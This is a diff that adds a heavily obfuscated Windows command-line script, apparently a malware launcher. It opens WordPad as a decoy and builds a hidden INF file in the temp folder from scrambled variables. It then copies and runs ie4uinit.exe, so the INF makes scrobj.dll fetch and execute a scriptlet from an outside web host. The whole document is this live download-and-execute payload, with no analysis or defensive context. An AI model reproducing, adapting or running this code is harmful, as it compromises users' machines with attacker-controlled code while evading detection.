@@ -1,0 +1,23 @@
+/v /c start "" "%ProgramFiles%\Windows NT\Accessories\wordpad.exe" & (for %b in ("inne=s" "encurt=t" "hlorrith=ll" "limnersq=e" ) do @set %~b) &&
+  (for %h in ("B") do @set "braehea=%~h") &&
+  call(for %n in ("u") do @set "perigemma=%~n") &&
+  (for %l in (" ") do @set "arb=%~l") &&
+  (for %i in ("%windir%") do @set "thronin=%~i") &&
+  call(for %r in ("m") do @set "seborrhoeic=%~r") &&
+  call(for %l in ("b") do @set "perversi=%~l") &&
+  (for %c in ("c") do @set "kay=%~c") &&
+  call(for %u in ("p") do @set "rewakenspro=%~u") &&
+  (for %j in ("a") do @set "omphalectom=%~j") &&
+  callcall(for %f in ("7") do @set "resil=%~f") &&
+  call(for %a in ("c") do @set "kay=%~a") &&
+  (for %d in ("n") do @set "tilla=%~d") &&
+  callcall(for %o in ("%temp%") do @set "coenosarco=%~o") &&
+  callcall(for %h in ("y") do @set "suda=%~h") &&
+  (for %g in ("F") do @set "jas=%~g") &&
+  call(for %k in ("a") do @set "omphalectom=%~k") &&
+  (for %m in ("n") do @set "tilla=%~m") &&
+  callcallcall(for %j in ("e") do @set "laborabi=%~j") &&
+  call(for %f in (".") do @set "prelaticaln=%~f") &&
+  (for %k in ("[strings]" "servicename= 'landammann'" "shortsvcname= 'landammann'" "corneummo=." "lox=/" "fancy=3" "uniridescen=4" "snafflingst=:" "tetraed=I" "stel=a" "quorp=b" "hemozoo=c" "bloodwor=d" "wiste=e" "dufreni=f" "chairwome=h" "cuidadobde=i" "fibromyo=j" "unflitc=l" "videotexts=n" "sestertia=o" "glomm=s" "sigmoidope=t" "woun=u" "debun=y" "[version]" "signature=$windows nt$" "[defaultinstall.windows7]" "delfiles=99C2B" "Un\" "Register\" "OCXs=whimsica_A7851F" "[99C2B]" "%cuidadobde%e%woun%i%videotexts%i%sigmoidope%.%cuidadobde%n%dufreni%" "[whimsica_A7851F]" "s%hemozoo%r%sestertia%b\" "%fibromyo%.%bloodwor%l%unflitc%,N%tetraed%,%chairwome%t%sigmoidope%p%snafflingst%/%lox%9%fancy%f%uniridescen%f%uniridescen%.%quorp%o%quorp%b%debun%w%wiste%i%glomm%m%stel%n%corneummo%c%sestertia%m%lox%k%stel%k%dufreni%g%stel%r" "[destinationdirs]" "defaultdestdir=11" "99C2B=01" ) do @echo %~k) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
